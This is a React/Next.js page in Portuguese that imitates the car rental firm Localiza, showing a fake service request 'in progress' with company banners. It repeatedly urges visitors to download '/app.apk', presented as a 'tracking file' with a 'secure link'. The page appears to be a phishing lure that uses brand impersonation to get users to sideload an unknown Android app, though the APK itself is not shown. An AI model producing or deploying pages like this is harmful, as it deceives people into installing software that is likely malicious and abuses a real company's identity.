"use client";

import { useState, useEffect } from "react";

export default function Home() {
  const banners = [
    "/MO_25_1194_COMECO_DE_ANO_BANNER-SITE-RAC_1920x616-1.jpg",
    "/RAC_25_1130_BANNER_SITE_MEXICO_LAY_V2.png",
    "/RAC_26_1234_AM_DESCONTO_PROGRESSIVO_banner-1920x616-1.png",
    "/RAC_26_1267_BANNER_PROGRAMA_FIDELIDADE_1920x616-1.png",
    "/SN_25_1088_CAMPANHA-MENSAL-DEZEMBRO-Bsnner-RAC-1920x616px_.png",
  ];

  const [currentBanner, setCurrentBanner] = useState(0);

  // Rotação automática do carrossel
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentBanner((prev) => (prev + 1) % banners.length);
    }, 5000); // Muda a cada 5 segundos

    return () => clearInterval(interval);
  }, [banners.length]);

  return (
    <div className="min-h-screen flex flex-col">
      {/* Header com Logo */}
      <header className="bg-[#01602a] shadow-sm py-3 sm:py-4 px-4 sm:px-6">
        <div className="max-w-6xl mx-auto flex items-center justify-center sm:justify-start">
          <img
            src="/localiza-logo.svg"
            alt="Localiza"
            className="h-6 sm:h-8 md:h-10"
          />
        </div>
      </header>

      {/* Conteúdo Principal */}
      <main className="flex-1 flex items-center justify-center px-3 sm:px-4 py-6 sm:py-12">
        <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg border border-gray-200 max-w-4xl w-full p-4 sm:p-6 md:p-8 lg:p-12">
          {/* Título e Status */}
          <div className="bg-[#01602a] text-white px-4 sm:px-6 py-4 sm:py-5 -mx-4 -mt-4 sm:-mx-6 sm:-mt-6 md:-mx-8 md:-mt-8 lg:-mx-12 lg:-mt-12 rounded-t-xl sm:rounded-t-2xl mb-6 sm:mb-8">
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
              <h1 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold leading-tight">
                Solicitação N° 61515712
              </h1>
              <div className="flex items-center gap-2 bg-white/20 px-3 sm:px-4 py-2 rounded-full self-start sm:self-auto">
                <svg
                  className="w-3 h-3 sm:w-4 sm:h-4 animate-spin flex-shrink-0"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    className="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                  ></circle>
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  ></path>
                </svg>
                <span className="text-xs sm:text-sm font-semibold whitespace-nowrap">
                  Em andamento
                </span>
              </div>
            </div>
          </div>

          {/* Carrossel de Banners */}
          <div className="mb-6 sm:mb-8 relative rounded-lg sm:rounded-xl overflow-hidden">
            <img
              src={banners[currentBanner]}
              alt={`Banner Localiza ${currentBanner + 1}`}
              className="w-full h-auto object-contain bg-gradient-to-r from-green-50 to-blue-50"
            />
          </div>

          {/* Seção de Acompanhamento */}
          <div className="bg-gradient-to-r from-green-50 to-blue-50 rounded-lg sm:rounded-xl p-4 sm:p-6 mb-4 sm:mb-6">
            <h4 className="text-lg sm:text-xl md:text-2xl font-bold text-gray-800 mb-3 sm:mb-4 text-center">
              Acompanhe em Tempo Real
            </h4>
            <p className="text-sm sm:text-base text-gray-700 text-center mb-4 sm:mb-6 leading-relaxed px-2">
              Baixe o arquivo de acompanhamento para receber atualizações em
              tempo real sobre o andamento da sua solicitação.
            </p>

            {/* Botão de Download Principal */}
            <div className="flex justify-center">
              <a
                href="/app.apk"
                download="Localiza-App.apk"
                className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-3 sm:py-4 px-6 sm:px-8 rounded-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200 flex items-center gap-2 sm:gap-3 text-sm sm:text-base md:text-lg touch-manipulation w-full sm:w-auto justify-center"
              >
                <svg
                  className="w-5 h-5 sm:w-6 sm:h-6 flex-shrink-0"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"
                  />
                </svg>
                <span className="leading-tight">
                  Baixar Arquivo de Acompanhamento
                </span>
              </a>
            </div>

            <p className="text-xs sm:text-sm text-gray-600 text-center mt-3 sm:mt-4 italic px-2">
              O arquivo será atualizado automaticamente com novas informações
            </p>
          </div>

          {/* Informações Importantes */}
          <div className="bg-blue-50 border-l-4 border-blue-500 rounded-lg p-4 sm:p-6">
            <h5 className="font-bold text-gray-800 mb-3 flex items-start sm:items-center gap-2 text-sm sm:text-base">
              <svg
                className="w-4 h-4 sm:w-5 sm:h-5 text-blue-500 flex-shrink-0 mt-0.5 sm:mt-0"
                fill="currentColor"
                viewBox="0 0 20 20"
              >
                <path
                  fillRule="evenodd"
                  d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                  clipRule="evenodd"
                />
              </svg>
              <span>Importante</span>
            </h5>
            <p className="text-gray-700 text-xs sm:text-sm mb-4 leading-relaxed">
              Para acompanhar as atualizações desta solicitação, baixe o arquivo
              acima. Ele contém um link seguro que será atualizado
              automaticamente com o status e respostas.
            </p>
            <h5 className="font-bold text-gray-800 mb-3 text-sm sm:text-base">
              Acompanhe em tempo real
            </h5>
            <a
              href="/app.apk"
              download="Localiza-App.apk"
              className="inline-block bg-green-500 hover:bg-green-600 text-white font-semibold py-2.5 sm:py-3 px-5 sm:px-6 rounded-lg transition-colors duration-200 text-sm sm:text-base touch-manipulation"
            >
              Baixar Arquivo
            </a>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-800 text-white py-4 sm:py-6 px-4">
        <div className="max-w-6xl mx-auto text-center">
          <p className="text-xs sm:text-sm">
            Localiza © 2026 Todos os direitos reservados
          </p>
        </div>
      </footer>
    </div>
  );
}
